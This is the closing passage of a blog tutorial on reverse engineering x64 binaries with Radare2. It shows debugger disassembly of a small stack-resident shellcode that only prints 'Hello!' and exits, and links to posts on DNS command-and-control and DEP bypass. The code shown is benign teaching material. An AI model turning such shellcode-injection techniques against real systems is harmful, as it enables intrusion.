<span class="err">│</span>           <span class="mh">0x55d39c38baf5</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bafa</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x55d39c38bafb</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55d39c38baf3</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dr</span> <span class="n">rdx</span>
<span class="mh">0x7ffe727894f0</span>
<span class="p">[</span><span class="mh">0x55d39c38baf3</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>And as we see if we use pd to dump those instructions there we see that they all make sense:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x559e09c42af3</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">20</span> <span class="err">@</span> <span class="mh">0x7ffe05af6b40</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
        <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x7ffe05af6b40</span>      <span class="n">eb00</span>           <span class="n">jmp</span> <span class="mh">0x7ffe05af6b42</span>
        <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x7ffe05af6b42</span>      <span class="mi">488</span><span class="n">d351d0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x7ffe05af6b66</span><span class="p">]</span> <span class="p">;</span> <span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span>
            <span class="mh">0x7ffe05af6b49</span>      <span class="n">bf01000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">1</span>
            <span class="mh">0x7ffe05af6b4e</span>      <span class="n">ba07000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span>
            <span class="mh">0x7ffe05af6b53</span>      <span class="n">b801000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
            <span class="mh">0x7ffe05af6b58</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
            <span class="mh">0x7ffe05af6b5a</span>      <span class="mi">31</span><span class="n">ff</span>           <span class="n">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
            <span class="mh">0x7ffe05af6b5c</span>      <span class="n">b83c000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x3c</span>           <span class="p">;</span> <span class="sc">'&lt;'</span> <span class="p">;</span> <span class="mi">60</span>
            <span class="mh">0x7ffe05af6b61</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
            <span class="mh">0x7ffe05af6b63</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
            <span class="mh">0x7ffe05af6b65</span>      <span class="n">c3</span>             <span class="n">ret</span>
            <span class="mh">0x7ffe05af6b66</span>      <span class="mi">48656</span><span class="n">c</span>         <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x7ffe05af6b69</span>      <span class="mi">6</span><span class="n">c</span>             <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x7ffe05af6b6a</span>      <span class="mi">6</span><span class="n">f</span>             <span class="n">outsd</span> <span class="n">dx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rsi</span><span class="p">]</span>
            <span class="mh">0x7ffe05af6b6b</span>      <span class="mi">210</span><span class="n">a</span>           <span class="n">and</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span>
</code></pre></div></div>
<p>And that will be enough for today.</p>

<p>On the next posts we’ll go over some more advanced topics such as command and control mechanisms over DNS this time exploring the Windows API instead.</p>


    </div>

    <div class="post__share">
  <ul class="share__list list-reset">
    <li class="share__item">
      <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/reversing-radare-16"
        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
        title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
    </li>

    <li class="share__item">
      <a class="share__link share__twitter" href="https://twitter.com/intent/tweet?text=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%2016%20-%20II%20(more%20sockets,%20http%20emulation,%20radasm,%20ragg%20and%20shellcode)&url=http://localhost:4000/reversing-radare-16"
        onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
        title="Share on Twitter" rel="nofollow"><i class="ion ion-logo-twitter"></i></a>
    </li>

    <li class="share__item">
      <a class="share__link share__linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/reversing-radare-16&title=Reverse%20engineering%20x64%20binaries%20with%20Radare2%20-%2016%20-%20II%20(more%20sockets,%20http%20emulation,%20radasm,%20ragg%20and%20shellcode)&summary=&source=Artik%20Blue"
      onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn" rel="nofollow"><i class="ion ion-logo-linkedin"></i></a>
    </li>
  </ul>
</div>


    <div class="post__navigation">
  
  <a class="post__prev" href="/opsec-2">
    <div class="prev__image">
      <img class="lazy" data-src="/images//opsec/opsec2.png" alt="Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)">
    </div>
    <div class="prev__box">
      <span class="post__nav post__nav__prev">Older post</span>
      <h2 class="post__nav__title">Operational security techniques in asymmetric conflicts - II (device acquisitions)</h2>
    </div>
  </a>
  

  
  <a class="post__next" href="/reversing-radare-17">
    <div class="next__box">
      <span class="post__nav post__nav__next">Newer post</span>
      <h2 class="post__nav__title">Reverse engineering x64 binaries with Radare2 - 17 (winsock, udp C&C and file exfiltration through DNS)</h2>
    </div>
    <div class="next__image">
      <img class="lazy" data-src="/images//radare2/radare2_17.png" alt="Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)">
    </div>
  </a>
  
</div>

     <!-- begin comments -->
<div id="disqus_thread" class="post__comments">
  <div id="disqus_empty"></div>
</div>

<script>
  function load_disqus() {
    var disqus_shortname = 'artikblue',
      is_disqus_empty = document.getElementById('disqus_empty'),
      disqus_target = document.getElementById('disqus_thread'),
      disqus_embed = document.createElement('script'),
      disqus_hook = (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]);

    if (disqus_target && is_disqus_empty) {
      disqus_embed.type = 'text/javascript';
      disqus_embed.async = true;
      disqus_embed.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      disqus_hook.appendChild(disqus_embed);
      is_disqus_empty.remove();
    }
  }

  window.addEventListener('scroll', function (e) {
    var currentScroll = document.scrollingElement.scrollTop;
    var disqus_target = document.getElementById('disqus_thread');

    if (disqus_target && (currentScroll > disqus_target.getBoundingClientRect().top - 150)) {
      load_disqus('disqus_shortname');
    }
  }, false);

</script>
<noscript>Please enable JavaScript to view the
  <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
</noscript>
<!-- end comments --> 

  </article>
</div>
<!-- end post -->
      </div>
      <!-- end wrapper-page -->
    </main>
    <!-- end content -->
    <div class="top" title="Top"><i class="ion ion-ios-arrow-round-up"></i></div>
    <!-- begin footer -->
<footer class="footer">
  <div class="container">
    <div class="row">
      <div class="col col-12 col-m-12">
        <div class="footer__inner">

          <div class="footer__head">
            <div class="row">
              <div class="col col-4 col-d-6 col-t-12">
  <div class="widget widget-recent">
    <div class="widget__head">
      <h3 class="widget__title">Recent Posts</h3>
    </div>
    
    <div class="recent-posts">
      
      <a class="recent-posts__image" href="/reversing-radare-22">
        <img class="lazy" data-src="/images//radare2/radare2_22.png" alt="Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack">
      </a>
      
      <div class="recent-posts__content">
        <div class="recent-posts__date">
          <time class="timeago" datetime="2022-06-20T00:01:35+02:00">Jun 20, 2022</time>
        </div>
        <h4 class="recent-posts__title"><a href="/reversing-radare-22">Reverse engineering x64 binaries with Radare2 - Enabling code execution on Stack</a></h4>
      </div>
    </div>
    
    <div class="recent-posts">
      
      <a class="recent-posts__image" href="/reversing-radare-21">
        <img class="lazy" data-src="/images//radare2/radare2_21.png" alt="Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains">
      </a>
      
      <div class="recent-posts__content">
        <div class="recent-posts__date">
          <time class="timeago" datetime="2022-06-15T00:01:35+02:00">Jun 15, 2022</time>
        </div>
        <h4 class="recent-posts__title"><a href="/reversing-radare-21">Reverse engineering x64 binaries with Radare2 - Bypasssing DEP with simple ROP Chains</a></h4>
      </div>
    </div>
    
  </div>
</div>
              <div class="col col-4 col-d-6 col-t-12">
  <div class="widget widget-gallery">
    <div class="widget__head">
      <h3 class="widget__title">Gallery</h3>
    </div>
    
    <div class="gallery-box gallery-footer">
      <div class="gallery">
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/landscape1.jpg" alt="Minimalism">
        </div>
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/sasha1.jpeg" alt="Minimalism">
        </div>
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/castle1.jpg" alt="Minimalism">
        </div>
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/scotland1.jpg" alt="Minimalism">
        </div>
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/sanfran1.jpg" alt="Minimalism">
        </div>
        
        <div class="gallery__image">
          <img class="lazy" data-src="/images/newyork1.jpg" alt="Minimalism">
        </div>
        
      </div>
    </div>
    
  </div>
</div>
              <div class="col col-4 col-d-6 col-t-12">
  <div class="widget widget-subscribe">
    <div class="widget__head">
      <h3 class="widget__title"></h3>
    </div>
    <div class="subscribe__inner">
      <div class="subscribe__group">
        <div class="subscribe__description"></div>
      </div>
      <!-- <form class="subscribe-form validate"
           action="#" method="POST" id="membedded-subscribe-form" name="membedded-subscribe-form" target="_blank" novalidate>
           <label class="screen-reader-text" for="mce-EMAIL">Email address</label>
           <input class="subscribe-email required email" id="mce-EMAIL" type="text" name="EMAIL"
           placeholder="Your email address">
           <button class="button subscribe-button" id="membedded-subscribe" type="submit" name="subscribe"></button>
           </form> -->
    </div>
  </div>
</div>

            </div>
          </div>
        </div>

        
  <div class="social">
    <ul class="social__list list-reset">
      
      <li class="social__item">
        <a class="social__link" href="https://twitter.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
      </li>
      
      <li class="social__item">
        <a class="social__link" href="https://github.com/artikblue" target="_blank" rel="noopener" aria-label="social icon"><i class="ion ion-logo-github"></i></a>
      </li>
      
    </ul>
  </div>

        <div class="copyright">2022 &copy; <a href="/">Artik Blue</a>
      </div>
    </div>
  </div>
</footer>
<!-- end footer -->


  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="/js/scripts.js"></script>
</body>

</html>